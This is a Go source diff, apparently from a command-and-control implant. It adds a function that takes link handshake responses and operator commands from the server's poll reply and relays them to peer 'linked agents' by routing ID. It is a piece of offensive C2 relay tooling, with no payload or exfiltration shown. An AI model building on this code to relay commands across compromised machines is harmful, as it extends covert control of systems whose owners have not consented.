@@ -574,6 +574,9 @@ func doPoll(secureComms *SecChan, customHeaders map[string]string) error {
 		}
 	}
 
+	// Forward link data from server to linked agents (handshake responses + commands)
+	processLinkResponseFields(responseMap)
+
 	// Check for no commands
 	if responseStatus == getPollStr(idxPollNoCommands) {
 		return nil
@@ -770,6 +773,53 @@ func processLinkHandshakeResponses(responses []interface{}) {
 		} else {
 		}
 		link.mu.Unlock()
+	}
+}
+
+// processLinkResponseFields extracts link handshake responses (lr) and link
+// commands (lc) from the server GET response and forwards them to linked agents.
+func processLinkResponseFields(responseMap map[string]interface{}) {
+	lm := getLinkManager()
+
+	if lrVal, ok := responseMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD]; ok {
+		if lrItems, ok := lrVal.([]interface{}); ok {
+			for _, item := range lrItems {
+				m, ok := item.(map[string]interface{})
+				if !ok {
+					continue
+				}
+				routingID, _ := m[MALLEABLE_ROUTING_ID_FIELD].(string)
+				payload, _ := m[MALLEABLE_PAYLOAD_FIELD].(string)
+				if routingID == "" || payload == "" {
+					continue
+				}
+				lm.forwardHandshakeRespToLinkedAgent(routingID, payload)
+			}
+		}
+	}
+
+	if lcVal, ok := responseMap[MALLEABLE_LINK_COMMANDS_FIELD]; ok {
+		if lcItems, ok := lcVal.([]interface{}); ok {
+			for _, item := range lcItems {
+				m, ok := item.(map[string]interface{})
+				if !ok {
+					continue
+				}
+				routingID, _ := m[MALLEABLE_ROUTING_ID_FIELD].(string)
+				payload, _ := m[MALLEABLE_PAYLOAD_FIELD].(string)
+				if routingID == "" || payload == "" {
+					continue
+				}
+				transformed, _ := m["t"].(bool)
+				if transformed {
+					pre, _ := m["pre"].(float64)
+					app, _ := m["app"].(float64)
+					lm.forwardToLinkedAgentRaw(routingID, payload, int(pre), int(app))
+				} else {
+					lm.forwardToLinkedAgent(routingID, payload)
+				}
+			}
+		}
 	}
 }
 
